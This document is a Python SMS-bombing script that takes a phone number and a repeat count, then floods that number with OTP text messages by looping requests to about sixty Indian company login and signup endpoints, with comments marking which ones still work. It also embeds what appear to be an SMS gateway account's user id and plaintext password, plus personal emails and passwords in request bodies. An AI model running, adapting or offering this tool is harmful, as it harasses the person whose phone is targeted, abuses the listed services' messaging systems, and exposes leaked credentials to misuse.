import requests
from requests.structures import CaseInsensitiveDict
number=str(input("Enter your number : "))
amount=int(input("Enter the amount  : "))
veri=int(input("Enter 1 Only : "))

url1 = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"
data1 = '{"mobile":"'+number+'\","organizationId":"5eb393ee95fab7468a79d189"}'


url59 = "https://www.mobex.in/graphql"

headers59 = CaseInsensitiveDict()
headers59["Content-Type"] = "application/json"

data59 = '{"operationName":"CreateAccountOTP","variables":{"mobileNumber":"91'+number+'\"},"query":"mutation CreateAccountOTP($mobileNumber: String!) {\n  createAccountOTP(mobileNumber: $mobileNumber) {\n    status\n    message\n    __typename\n  }\n}"}'




url58 = "https://seller.flipkart.com/napi/graphql"
headers58 = CaseInsensitiveDict()
headers58["Content-Type"] = "application/json"
data58 = '{"operationName":"SellerOnboarding_GenerateOTPMobile","variables":{"mobileNo":"'+number+'\"},"query":"mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n"}'



url52 = "https://apinew.moglix.com/nodeApi/v1/login/sendOTP"
headers52 = CaseInsensitiveDict()
headers52["Content-Type"] = "application/json"
data52 = '{"email":"","phone":"'+number+'\","type":"p","source":"signup","buildVersion":"24.0","device":"mobile"}'

url55 = "https://api.penpencil.co/v1/users/resend-otp?smsType=1"

headers55 = CaseInsensitiveDict()
headers55["Content-Type"] = "application/json"

data55 = '{"mobile":"'+number+'\","organizationId":"5eb393ee95fab7468a79d189"}'

#good
url98 = "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189"
headers98 = CaseInsensitiveDict()
headers98["Content-Type"] = "application/json"
data98 = '{"mobile":"'+number+'\","countryCode":"+91","firstName":"Darling"}'

#good
url56 = "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile"
headers56 = CaseInsensitiveDict()
headers56["Content-Type"] = "application/json"

data56 = '{"query":"\n  mutation($email: String, $phone: String, $otpLength: Int) {\n    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n      success\n      message\n    }\n  }\n","variables":{"phone":"9336734442"}}'

#good
url57 = "https://www.samsung.com/in/api/v1/sso/otp/init"
headers57 = CaseInsensitiveDict()
headers57["Content-Type"] = "application/json"

data57 = '{"user_id":"'+number+'\"}'




#bad
url53 = "https://api.countrydelight.in/api/auth/new_request_otp"

headers53 = CaseInsensitiveDict()
headers53["Content-Type"] = "application/json"

data53 = '{"mobile_no":"'+number+'\","new_user":true}'


url54 = "https://applications.csjmu.ac.in/btech2023/send_otp.php"
headers54 = CaseInsensitiveDict()
headers54["Content-Type"] = "application/x-www-form-urlencoded"
data54 = "mobileno="+number+'&loggingin=true"'




#good

url44 = "https://api.mamaearth.in/v1/auth/initiateSignup"
headers44 = CaseInsensitiveDict()
headers44["Content-Type"] = "application/json"
data44 = '{"email":"shivamrajput2007@gmail.com","contact":"'+number+'\","isGupshup":true}'

#good
url45 = "https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber="+number
headers45 = CaseInsensitiveDict()
headers45["Content-Type"] = "application/json"
headers45["Content-Length"] = "0"

#all
url51 = "https://entri.app/api/v3/users/check-phone/"
headers51 = CaseInsensitiveDict()
headers51["Content-Type"] = "application/json"
data51 = '{"phone":"+91'+number+'\"}'



url50 = "https://www.licious.in/api/login/signup"

headers50 = CaseInsensitiveDict()
headers50["Content-Type"] = "application/json"

data50 = '{"phone":"'+number+'\","captcha_token":null}'

#all
url49 = "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp"
headers49 = CaseInsensitiveDict()
headers49["Content-Type"] = "application/json"
data49 = '{"phone_no":"+91'+number+'\","website":true,"is_guest_checkout":false}'



url46 = "https://www.planetfashion.in/login/resendOTP?isAjax=true"
headers46 = CaseInsensitiveDict()
headers46["Content-Type"] = "application/x-www-form-urlencoded"
data46 = "mobile="+number+'\"&register=register&module=register"'


url47 = "https://www.planetfashion.in/register/customerRegisterOtpCheck?isAjax=true"
headers47 = CaseInsensitiveDict()
headers47["Content-Type"] = "application/x-www-form-urlencoded"
data47 = "buythelook=0&gender=him&gender1=on&firstname=Shivam&mobile="+number+'\"&password=stronga%2540pass&email=shivamrajput662007%2540gmail.com"'


url48 = "https://user.vedantu.com/user/resendPreLoginVerificationOTP"
headers48 = CaseInsensitiveDict()
headers48["Content-Type"] = "application/json"
data48 = '{"email":null,"phoneCode":"+91","phoneNumber":"'+number+'\","version":2,"ver":"12.377"}'






url2 = "https://be.mcdelivery.co.in/auth/otp/"+number
url27 = "https://m.netmeds.com/mst/rest/v1/id/details/"+number
#GET{method}

url20 = "https://www.oneapollo.com/wp-json/lmsRoute/v1/user/?mobile="+number

url26 = "https://m.mirraw.com/accounts/send_otp"
headers26 = CaseInsensitiveDict()
headers26["Content-Type"] = "application/x-www-form-urlencoded"
data26 = "phone="+number+""

url29 = "https://enterprise.smsgupshup.com/GatewayAPI/rest?method=SendMessage&send_to="+number+'&msg=Dear%20Guest%20the%20OTP%20verification%20code%20is%20999789%20Woodland%20Team&msg_type=TEXT&userid=2000223571&auth_scheme=plain&password=Wdl@2168&v=1.1&format=text'


#good
url17 = "https://login.web.ajio.com/api/auth/signupSendOTP"
headers17 = CaseInsensitiveDict()
headers17["Content-Type"] = "application/json"
data17 = '{"login":"shivamrajput@gmail.com","mobileNumber":"'+number+'\","firstName":"Shivam Rajput","password":"Shiva@662006","genderType":"M","rilFnlRegisterReferralCode":"","requestType":"SENDOTP","newDesign":false}'

#good
url18 = "https://www.nykaafashion.com/webscripts/api/otp/generate"
headers18 = CaseInsensitiveDict()
headers18["Content-Type"] = "application/json"
data18 = '{"customer_mobile":"'+number+'\"}'

url19 = "https://www.industrybuying.com/api/v3/users/send-otp/"
headers19 = CaseInsensitiveDict()
headers19["Content-Type"] = "application/x-www-form-urlencoded"
data19 = "username="+number+""

url21 = "https://api.toolsvilla.com/web/register"
headers21 = CaseInsensitiveDict()
headers21["Content-Type"] = "application/json"
data21 = '{"firstname":"","mobileno":"'+number+'\","email":"","wtpSubs":true}'

url22 = "https://apinew.moglix.com/nodeApi/v1/login/sendOTP"
headers22 = CaseInsensitiveDict()
headers22["Content-Type"] = "application/json"
data22 = '{"email":"","phone":"'+number+'\","type":"p","source":"signup","buildVersion":"24.0","device":"mobile"}'

#bad
url23 = "https://auto.mahindra.com/api/sendotp"
headers23 = CaseInsensitiveDict()
headers23["Content-Type"] = "application/json"
data23 = '{"mobileNumber":"'+number+'\"}'
#good
url24 = "https://www.tataplay.com/inception-pack/otp/resend-otp"
headers24 = CaseInsensitiveDict()
headers24["Content-Type"] = "application/json"
data24 = '{"journeySource":"REGISTER","id":"'+number+'\"}'

url25 = "https://www.nexaexperience.com/api/sitecore/NexaUserLogin/SendOtp"
headers25 = CaseInsensitiveDict()
headers25["Content-Type"] = "application/x-www-form-urlencoded"
data25 = "=&Name=Ggggg&Email=shivamrajput2007%40gmail.com&Mobile="+number


#good
url3 = "https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLoginOTP"
headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"
data3 = '{"country_code":"+91","is_otp_resend":false,"mob_no":"'+number+'\","user_id":""}'
#good
url4 = "https://identity.tllms.com/api/request_otp"
headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"
data4 = '{"phone":"+91-'+number+'\","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'
#good
url5 = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/json"
data5 = '{"phone":"'+number+'\","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}'
#good
url6 = "https://khiladi.com/v1/exchange/user/userRegisterOtpSent"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"
data6 = '{"mobileNo":"+91'+number+'\","userName":"LANDROID"}'
#good
url7 = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"
data7 = '{"mobile":"'+number+'\","deviceId":"72abdd9a-7038-41c0-a57d-d0022dac60da","deviceName":"","refCode":"","isPlaycircle":false}'
#bad
url8 = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/json"
data8 = '{"mobile":"'+number+'\","deviceId":"1aeb7fad-58d0-4887-9f77-2a469039a413","deviceName":"","refCode":"","isPlaycircle":false}'

#bad
url9 = "https://apis.cardekho.com/f8"
headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"
data9 = '{"operationName":"SendOtp","variables":{"payload":{"mobile":"'+number+'\","connectoid":"b17aeac2-2d46-562b-ef52-67b851d3ae6b","waOtp":false,"platform":"wap","utmParams":{}}},"query":"mutation SendOtp($payload: UserInput!) {\n  sendOtp(payload: $payload) {\n    token\n    name\n    existingUser\n    whatsappOptIn\n    __typename\n  }\n}\n"}'

#good
url10 = "https://api.spinny.com/api/c/user/otp-request/"
headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/json"
data10 = '{"contact_number":"'+number+'\","whatsapp":false,"code_len":4}'
#good
url11 = "https://api.gromoinsure.com/v1/auth/sendOTP"
headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/json"
data11 = '{"phone":"'+number+'\"}'
#bad
url12 = "https://gomechanic.app/api/send_otp/"
headers12 = CaseInsensitiveDict()
headers12["Content-Type"] = "application/json"
data12 = '{"number":"'+number+'\","source":"website"}'
#good
url13 = "https://www.tractorjunction.com/ajax/send-otp/?mobile="+number
#good
url14 = "https://kukufm.com/api/v1/users/auth/send-otp/"
headers14 = CaseInsensitiveDict()
headers14["Content-Type"] = "application/json"
data14 = '{"phone_number":"+91'+number+'\"}'
#good
url15 = "https://customer.rapido.bike/api/otp"
headers15 = CaseInsensitiveDict()
headers15["Content-Type"] = "application/json"
data15 = '{"mobile":"'+number+'\"}'

#good
url16 = "https://loginprod.medibuddy.in/unified-login/user/register"
headers16 = CaseInsensitiveDict()
headers16["Content-Type"] = "application/json"
data16 = '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+number+'\","screen":"login-page","advertiserId":"56d487a8-89b1-Lbd9-a831-c69940c6a649","mbUserId":null}'

#good
url28 = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
headers28 = CaseInsensitiveDict()
headers28["Content-Type"] = "application/json"
data28 = '{"mobile_number":"'+number+'\","client_id":"kisan-app"}'

#good
url30 = "https://m.snapdeal.com/sendOTP"
headers30 = CaseInsensitiveDict()
headers30["Content-Type"] = "application/json"
data30 = '{"mobileNumber":"'+number+'\","purpose":"LOGIN_WITH_MOBILE_OTP"}'

#all #bad
url31 = "https://cowin.eka.care/v2/generate_otp"
headers31 = CaseInsensitiveDict()
headers31["Content-Type"] = "application/json"
data31 = '{"mobile_no":"+91'+number+'\","allow_whatsapp":false,"auto_retry":false}'

#good
url32 = "https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash"
headers32 = CaseInsensitiveDict()
headers32["Content-Type"] = "application/json"
data32 = '{"mobileNumber":"'+number+'\","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}'

#all#good
url33 = "https://apistaging.justmyroots.com/api/web/auth/signup"
headers33 = CaseInsensitiveDict()
headers33["Content-Type"] = "application/json"
data33 = '{"phoneNumber":"91'+number+'\","firstName":"JHON","lastName":"SENNA","email":"srrajput@gmail.com","location":"India"}'

#all #bad
url34 = "https://admin.boxfood.in/api/send_otp?android_version=18"
headers34 = CaseInsensitiveDict()
headers34["Content-Type"] = "application/json"
data34 = '{"phone_number":"'+number+'\","country_code":"IND","dialing_code":"+91","is_new_customer":false,"hash":"03AL8dmw9nmpLi7boig8dTXJhdZT83pt8F1-EvwYqPsHVbVVX-QaCXsxu1LXF70EjEH8-e4vwCMfOlvkJM--vr7YiX5T3d5HOYn1auST1dzZ4y7UTIWgRgnIkZ_TFWsIVf8-qmVdbHogXjtb0MU1YSC6AuukOk1m1q1gVviXQTj1m1t5WjYELhcRF82X0a8hUQBIq771O6oosUAm_iG4BTz4fZDgdyNmlDltAM9p_PYPQ85Q8B2SrN1DSWLL5XpkspOA6HHevSRwJqD_oevbCgU8CtOiXfQR2z-otUuAmGO-_dBXpug8VdNbwvxqVPjwerr0nWbXStUFCqo1_AJUUP7Qq0_-3FtQmNB3ES4uF5HiF3bsa6eARpzH5tanRAgNPhhykkM7bwgEyETbms0B5EtIfXYcPA25bbv67ztP8KyRydecXw2GayLWDHQOImWE7kLV7QPJ8ffSSt_k25iyt1bujhblX4TfuMeh9BhblDoyIC8l5a2CBj8yIZHZ4IFev16vmFXMW6kyPdIQYq4zMXkeGyMbQ_yaA9bagktpphOxyYeQGg7s13VM2BQ9zNkb2oY1hwwIlVUsLdKUVc2HR3mSH2L92LKzFKZg"}'
#all #bad
url35 = "https://eatiko.com/public/api/custom-otp-user"
headers35 = CaseInsensitiveDict()
headers35["Content-Type"] = "application/json"
data35 = '{"phone":"+91'+number+'\","verify_token":"6c5a6efcfaae4a2bdc51bbcaf1c66f66"}'

url99 = "https://tizola.in/api/register"
headers99 = CaseInsensitiveDict()
headers99["Content-Type"] = "application/x-www-form-urlencoded"
data99 = "customer_name=Shivam%2BRajput&email=shivam27%2540gmail.com&mobile="+number+'\"&password=H6%2540NSfjQ6m2vF&password_cnf=H6%2540NSfjQ6m2vF"'

url36 = "https://tizola.in/api/login"
headers36 = CaseInsensitiveDict()
headers36["Content-Type"] = "application/x-www-form-urlencoded"

data36 = "username="+number+'\"&password=RG5%2540znmkA%254073D"'

#goos
url37 = "https://webapi.zoopindia.com/customers/resend-otp"
headers37 = CaseInsensitiveDict()
headers37["Content-Type"] = "application/json"
data37 = '{"mobile":"'+number+'\","customerId":901718}'


url38 = "https://webapi.zoopindia.com/customers/login"
headers38 = CaseInsensitiveDict()
headers38["Content-Type"] = "application/json"
data38 = '{"mobile":"'+number+'\","source":"Mobile-Web"}'
#good
url39 = "https://api.shadowfax.in/delivery/otp/send/"
headers39 = CaseInsensitiveDict()
headers39["Content-Type"] = "application/json"
data39 = '{"mobile_number":"'+number+'\"}'


url40 = "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"

headers40 = CaseInsensitiveDict()
headers40["Content-Type"] = "application/x-www-form-urlencoded"

data40 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'


#all #good
url41 = "https://www.shopsy.in/api/1/action/view"

headers41 = CaseInsensitiveDict()
headers41["Content-Type"] = "application/json"

data41 = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'+number+'\","clientQueryParamMap":{"ret":"/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAjwyeujBhA5EiwA5WD7_QCLQc98rqTGftpXGqHEi1QZ_OKk7Rg76Aevk1OftIkhpIfX1rM1zxoCkL8QAvD_BwE","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'


url42 = "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"
headers42 = CaseInsensitiveDict()
headers42["Content-Type"] = "application/x-www-form-urlencoded"
data42 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'


#good
url43 = "https://www.jio.com/api/jio-login-service/login/sendOtp"
headers43 = CaseInsensitiveDict()
headers43["Content-Type"] = "application/json"
data43 = '{"mobileNumber":"'+number+'\","loginFlowType":"MOBILE","alternateNumber":""}'


for k in range (veri):
 resp98 = requests.post(url98, headers=headers98, data=data98)
 resp99 = requests.post(url99, headers=headers99, data=data99)
 print("Verfication Done")

for j in range (amount):
 resp59 = requests.post(url59, headers=headers59, data=data59)
 print("sms sent")
 resp58 = requests.post(url58, headers=headers58, data=data58)
 print("sms sent")
 resp54 = requests.post(url54, headers=headers54, data=data54)
 print("sms sent")
 resp55 = requests.post(url55, headers=headers55, data=data55)
 print("sms sent")
 resp57 = requests.post(url57, headers=headers57, data=data57)
 print("sms sent")
 resp56 = requests.post(url56, headers=headers56, data=data56)
 print("sms sent")
 resp1 = requests.post(url1, headers=headers1, data=data1)
 print("sms sent")
 resp2 = requests.get(url2)
 print("sms sent")
 resp3 = requests.post(url3, headers=headers3, data=data3)
 print("sms sent")
 resp4 = requests.post(url4, headers=headers4, data=data4)
 print("sms sent")
 resp5 = requests.post(url5, headers=headers5, data=data5)
 print("sms sent")
 resp6 = requests.post(url6, headers=headers6, data=data6)
 print("sms sent")
 resp7 = requests.post(url7, headers=headers7, data=data7)
 print("sms sent")
 resp8 = requests.post(url8, headers=headers8, data=data8)
 print("sms sent")
 resp9 = requests.post(url9, headers=headers9, data=data9)
 print("sms sent")
 resp10 = requests.post(url10, headers=headers10, data=data10)
 print("sms sent")
 resp11 = requests.post(url11, headers=headers11, data=data11)
 print("sms sent")
 resp12 = requests.post(url12, headers=headers12, data=data12)
 print("sms sent")
 resp13 = requests.get(url13)
 print("sms sent")
 resp14 = requests.post(url14, headers=headers14, data=data14)
 print("sms sent")
 resp15 = requests.post(url15, headers=headers15, data=data15)
 print("sms sent")
 resp16 = requests.post(url16, headers=headers16, data=data16)
 print("sms sent")
 resp17 = requests.post(url17, headers=headers17, data=data17)
 print("sms sent")
 resp18 = requests.post(url18, headers=headers18, data=data18)
 print("sms sent")
 resp19 = requests.post(url19, headers=headers19, data=data19)
 print("sms sent")
 resp20 = requests.get(url20)
 print("sms sent")
 resp21 = requests.post(url21, headers=headers21, data=data21)
 print("sms sent")
 resp22 = requests.post(url22, headers=headers22, data=data22)
 print("sms sent")
 resp23 = requests.post(url23, headers=headers23, data=data23)
 print("sms sent")
 resp24 = requests.post(url24, headers=headers24, data=data24)
 print("sms sent")
 resp25 = requests.post(url25, headers=headers25, data=data25)
 print("sms sent")
 resp26 = requests.post(url26, headers=headers26, data=data26)
 print("sms sent")
 resp27 = requests.get(url27)
 print("sms sent")
 resp28 = requests.post(url28, headers=headers28, data=data28)
 print("sms sent")
 resp29 = requests.get(url29)
 print("sms sent")
 resp30 = requests.post(url30, headers=headers30, data=data30)
 print("sms sent")
 resp31 = requests.post(url31, headers=headers31, data=data31)
 print("sms sent")
 resp32 = requests.post(url32,
headers=headers32, data=data32)
 print("sms sent")
 resp33 = requests.post(url33, headers=headers33, data=data33)
 print("sms sent")
 resp34 = requests.post(url34,
headers=headers34, data=data34)
 print("sms sent")
 resp35 = requests.post(url35, headers=headers35, data=data35)
 print("sms sent")
 resp36 = requests.post(url36, headers=headers36, data=data36)
 print("sms sent")
 resp37 = requests.post(url37,
headers=headers37, data=data37)
 print("sms sent")
 resp38 = requests.post(url38, headers=headers38, data=data38)
 print("sms sent")
 resp39 = requests.post(url39, headers=headers39, data=data39)
 print("sms sent")
 resp40 = requests.post(url40, headers=headers40, data=data40)
 print("sms sent")
 resp41 = requests.post(url41, headers=headers41, data=data41)
 print("sms sent")
 resp42 = requests.post(url42, headers=headers42, data=data42)
 print("sms sent")
 resp43 = requests.post(url43, headers=headers43, data=data43)
 print("sms sent")
 resp44 = requests.post(url44, headers=headers44, data=data44)
 print("sms sent")
 resp45 = requests.post(url45, headers=headers45)
 print("sms sent")
 resp46 = requests.post(url46, headers=headers46, data=data46)
 print("sms sent")
 resp47 = requests.post(url47, headers=headers47, data=data47)
 print("sms sent")
 resp48 = requests.post(url48, headers=headers48, data=data48)
 print("sms sent")
 resp49 = requests.post(url49, headers=headers49, data=data49)
 print("sms sent")
 resp50 = requests.post(url50, headers=headers50, data=data50)
 print("sms sent")
 resp51 = requests.post(url51, headers=headers51, data=data51)
 print("sms sent")
 resp52 = requests.post(url52, headers=headers52, data=data52)
 print("sms sent")
 resp53 = requests.post(url53, headers=headers53, data=data53)
 print("sms sent")
 print(str(j+1)+" Round Complete")
